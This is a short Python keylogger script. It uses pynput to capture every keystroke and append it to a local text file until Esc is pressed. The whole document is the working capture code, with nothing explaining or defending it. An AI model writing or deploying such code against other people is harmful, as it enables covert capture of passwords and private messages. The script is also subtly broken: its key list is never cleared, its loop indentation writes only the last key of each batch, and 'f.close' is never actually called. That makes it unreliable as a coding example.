from pynput import keyboard

cpt = 0;
keys_arr = []


def pressed(key):
    global keys_arr,cpt
    keys_arr.append(key)
    cpt+=1

    if cpt:
        cpt = 0
        write_into_file(keys_arr)

def released(key):
    if key == keyboard.Key.esc:
        return False

def write_into_file(arr):
    with open("keylogger.txt", "a") as f:
        for key in arr:
            k = str(key).replace("'","")
            
        if k.find("space") > 0:
            f.write('\n')
            f.close
        else:
            f.write(k)

print("press esc to stop the program \n")

with keyboard.Listener(on_press=pressed, on_release=released) as listen:
    listen.join()

print("\nfind the result in keylogger.txt\n")